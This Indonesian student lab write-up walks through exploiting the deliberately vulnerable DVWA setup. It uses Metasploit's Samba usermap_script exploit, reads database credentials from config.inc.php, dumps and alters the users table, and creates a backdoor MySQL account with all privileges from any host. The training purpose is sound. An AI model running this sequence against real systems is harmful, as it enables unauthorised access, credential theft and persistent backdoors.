# Tugas Final Project

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147


### DVWA
  ### Lesson 4
  #### 1. Login ke dvwa, dengan default password "password"
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/dvwa%20login.PNG)
  #### 2. Setting security level menjadi "low"
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/security%20low.PNG)
  #### 3. Ping melalui command execution
  Hal ini dilakukan untuk memastikan dvwa kita terhubung
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/Command%20Execution%20Try.PNG)  
  
  #### 4. Buka Metasploit Framework di Kali Linux
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/MEtasploit%20framework.PNG)  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/Open%20Metasploit.PNG)
  
  #### 5. Gunakan Metasploit untuk connect
  
  ```bash
   use exploit/multi/samba/usermap_script
   ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/Command%20usermap_script.PNG)
  
  #### 6. Set RHOST menggunakkan IP dvwa
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/Set%20RHOST.PNG)
  
  #### 7. Lakukan exploit
  Jika berhasil akan muncul seperti gambar dibawah ini
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/Exploit.PNG)
  
  #### 8. Cek apakah kita sudah masuk ke dalam server dvwa
  ``` bash
  whoami
  ```
  command di atas akan memberitahukan kita masuk sebagai apa di dalam server.
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/whoami_dkk.PNG)
  
  #### 9. Cek permission dan isi dari folder dvwa
  ```bash
  ls -ld /var/www/dvwa
  ```
  ```bash
  ls -l /var/www/dvwa
  ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/explore%20process.PNG)

  #### 10. Buka folder config, dan file config.inc.php
  
  Dari hasil diatas terlihat adanya folder config, folder ini akan di eksplorasi selanjutnya
  ```bash
  ls -l /var/www/dvwa/config
  ```
  Kemudian buka file config.inc.php yang isinya akan menunjukkan username dan password dari database
  ```bash
  car /var/www/dvwa/config/config.inc.php
  ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/get%20password.PNG)
  
  dari situ terlihat username "root" dan passwordnya kosong
  
  #### 11. Uji coba dengan melakukan manipulasi database dvws
  
  ##### Melihat list database
  ```sql
  echo "show databases;" | mysql -u root;
  ```
  ##### Melihat tabel dari database
  ```sql
  echo "use dvwa; show tables;" | mysql -u root
  ```
  ##### Menjalankan query
  ```sql
  echo "select * from dvwa.users;" | mysql -u root
  ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/explore%20databases.PNG)
  
  ##### Memasukkan data baru
  ```sql
  echo "insert into dvwa.users values('7','Faiq','Firdausy','shinigami',
  MD5('123'), 'NA');" | mysql -u root
  ```
  Syntax yang digunakan layaknya sql pada umumnya.
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/insert.PNG)
  
  terlihat data yang dimasukkan melalui metasploit ada di record terakhir.
  
  #### 12. Uji coba mysql
  
  ##### Membuat user baru Mysql
  ```sql
  echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%'
  IDENTIFIED BY 'abc123' WITH GRANT OPTION;" | mysql -u root
  ```
  Command tersebut akan membuat user baru yang memiliki segala privileges dan membuat kita
  dapat mengakses darimanapun dan kapanpun
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/add%20db_hacker.PNG)
  
  ##### Pembuktian dengan mengakses mysql di host dvwa melalui terminal baru
  
  ```sql
  mysql -u db_hacker -h 192.168.1.32 -p
  ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/login%20db_hacker.PNG)  
  
  setelah berhasil login, coba untuk melihat database.
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/show%20databases%20db_hacker.PNG)
  
  
  
